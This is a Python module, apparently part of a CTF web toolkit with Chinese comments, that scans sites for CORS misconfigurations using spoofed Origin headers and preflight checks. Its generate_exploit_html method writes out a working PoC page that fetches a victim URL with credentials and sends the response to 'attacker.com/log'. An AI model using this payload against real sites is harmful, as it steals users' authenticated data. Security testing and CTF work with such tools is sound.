"""
CTF Web Toolkit - CORS Misconfiguration Checker
支持：
  - Origin 反射检测（任意域）
  - Null Origin 绕过
  - 可信子域名绕过
  - 通配符误用检测
  - 预检请求 (OPTIONS) 分析
  - 带 credentials 的 CORS 利用
"""

from typing import Optional, List, Dict
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 测试 Origin 列表 ──────────────────────────
TEST_ORIGINS = [
    "https://evil.com",
    "null",                              # null origin
    "https://victim.com.evil.com",       # 后缀绕过
    "https://evil.victim.com",           # 子域名绕过
    "https://xevil.com",                 # 前缀绕过
    "http://evil.com",                   # HTTP 降级
    "https://evil.com%60.victim.com",    # URL 编码绕过
]


class CORSChecker:
    """CORS 错误配置检测"""

    def __init__(self, requester: Requester):
        self.req = requester

    def check_origin_reflection(self, url: str,
                                 method: str = "GET") -> Optional[str]:
        """
        检测服务端是否将 Origin 直接反射到 Access-Control-Allow-Origin
        """
        section(f"CORS Origin 反射检测: {url}")
        test_origin = "https://evil.com"
        resp = _send_with_origin(self.req, url, test_origin, method)
        if resp:
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if test_origin in acao:
                if acac.lower() == "true":
                    found("严重 CORS 漏洞",
                          f"任意 Origin + Credentials=true → 可窃取敏感数据")
                else:
                    found("CORS 漏洞",
                          f"Access-Control-Allow-Origin: {acao}")
                return test_origin
            elif acao == "*":
                if acac.lower() == "true":
                    warn("CORS 配置矛盾：* + credentials=true (浏览器会拒绝但配置有误)")
                else:
                    info(f"  允许所有来源 (*), 但不含 credentials，风险较低")
        info("未发现 Origin 反射")
        return None

    def check_null_origin(self, url: str, method: str = "GET") -> bool:
        """检测 null Origin 是否被允许（沙盒 iframe 可利用）"""
        section("null Origin 检测")
        resp = _send_with_origin(self.req, url, "null", method)
        if resp:
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if "null" in acao:
                if acac.lower() == "true":
                    found("null Origin + Credentials",
                          "可通过沙盒 iframe 发起跨域请求并获取凭据")
                else:
                    found("null Origin 允许", acao)
                return True
        info("null Origin 未被允许")
        return False

    def check_subdomain_bypass(self, url: str, target_domain: str,
                                method: str = "GET") -> List[str]:
        """
        测试子域名绕过：
        如果 victim.com 允许 *.victim.com，则子域名 XSS 可被利用
        """
        section(f"子域名绕过测试: {target_domain}")
        test_origins = [
            f"https://evil.{target_domain}",
            f"https://www.evil.{target_domain}",
            f"https://{target_domain}.evil.com",
            f"https://not{target_domain}",
            f"https://x.{target_domain}",
            f"https://1.{target_domain}",
        ]
        vulnerable = []
        for origin in test_origins:
            resp = _send_with_origin(self.req, url, origin, method)
            if resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if origin in acao or target_domain in acao:
                    if acac.lower() == "true":
                        found("子域名绕过 (有 Credentials)", origin)
                    else:
                        found("子域名绕过", origin)
                    vulnerable.append(origin)
                else:
                    info(f"  {origin}: 拒绝")
        return vulnerable

    def full_scan(self, url: str,
                  target_domain: str = "",
                  method: str = "GET") -> dict:
        """全面 CORS 扫描"""
        section(f"CORS 全面扫描: {url}")
        result = {
            "origin_reflection": None,
            "null_origin": False,
            "wildcard": False,
            "credentials": False,
            "subdomain_bypass": [],
            "preflight": {},
        }

        # 1. 检测 Origin 反射
        result["origin_reflection"] = self.check_origin_reflection(url, method)

        # 2. null Origin
        result["null_origin"] = self.check_null_origin(url, method)

        # 3. 通配符检测
        resp = self.req.get(url)
        if resp:
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                result["wildcard"] = True
                info(f"  通配符 CORS: *")
            if acac.lower() == "true":
                result["credentials"] = True
                warn(f"  Access-Control-Allow-Credentials: true")

        # 4. 预检请求分析
        result["preflight"] = self._check_preflight(url)

        # 5. 子域名绕过
        if target_domain:
            result["subdomain_bypass"] = self.check_subdomain_bypass(
                url, target_domain, method
            )

        # 6. 所有测试 Origin
        section("批量 Origin 测试")
        for origin in TEST_ORIGINS:
            resp = _send_with_origin(self.req, url, origin, method)
            if resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao and acao != "" and (origin in acao or acao == "*"):
                    status = "✓ 有 Credentials" if acac.lower() == "true" else "普通"
                    ok(f"  [{status}] Origin={origin!r} → ACAO={acao!r}")
                else:
                    info(f"  拒绝: {origin}")

        return result

    def _check_preflight(self, url: str) -> dict:
        """分析 OPTIONS 预检请求"""
        section("预检请求分析 (OPTIONS)")
        try:
            resp = self.req.session.options(url,
                                             headers={"Origin": "https://evil.com",
                                                      "Access-Control-Request-Method": "POST",
                                                      "Access-Control-Request-Headers": "Content-Type,Authorization"},
                                             timeout=self.req.timeout,
                                             verify=self.req.verify_ssl)
            result = {}
            cors_headers = ["Access-Control-Allow-Origin",
                            "Access-Control-Allow-Methods",
                            "Access-Control-Allow-Headers",
                            "Access-Control-Allow-Credentials",
                            "Access-Control-Max-Age"]
            for h in cors_headers:
                val = resp.headers.get(h, "")
                if val:
                    result[h] = val
                    if h == "Access-Control-Allow-Methods":
                        ok(f"  允许方法: {val}")
                    elif h == "Access-Control-Allow-Headers":
                        ok(f"  允许头部: {val}")
                    elif h == "Access-Control-Allow-Credentials" and val.lower() == "true":
                        warn(f"  {h}: {val} ← 注意！")
                    else:
                        info(f"  {h}: {val}")
            return result
        except Exception as e:
            info(f"  OPTIONS 请求失败: {e}")
            return {}

    def generate_exploit_html(self, target_url: str,
                               exfil_url: str = "https://attacker.com/log") -> str:
        """生成 CORS 漏洞利用 PoC HTML"""
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS Exploit PoC</title></head>
<body>
<script>
// CORS 漏洞利用 PoC
// 目标: {target_url}
// 数据回传: {exfil_url}
fetch('{target_url}', {{
    method: 'GET',
    credentials: 'include',  // 携带 Cookie
    headers: {{
        'Content-Type': 'application/json',
    }}
}})
.then(r => r.text())
.then(data => {{
    // 将响应数据发送到攻击者服务器
    fetch('{exfil_url}?data=' + encodeURIComponent(data));
    document.getElementById('output').innerText = data.substring(0, 500);
}})
.catch(e => document.getElementById('output').innerText = 'Error: ' + e);
</script>
<h3>CORS PoC - 响应数据:</h3>
<pre id="output">Loading...</pre>
</body>
</html>"""


# ── 内部辅助 ─────────────────────────────────
def _send_with_origin(req: Requester, url: str, origin: str,
                      method: str = "GET"):
    """发送带指定 Origin 头的请求"""
    try:
        headers = {"Origin": origin}
        if method.upper() == "GET":
            return req.session.get(url, headers=headers,
                                   timeout=req.timeout,
                                   verify=req.verify_ssl,
                                   allow_redirects=True)
        else:
            return req.session.post(url, headers=headers,
                                    timeout=req.timeout,
                                    verify=req.verify_ssl,
                                    allow_redirects=True)
    except Exception as e:
        err(f"请求失败: {e}")
        return None
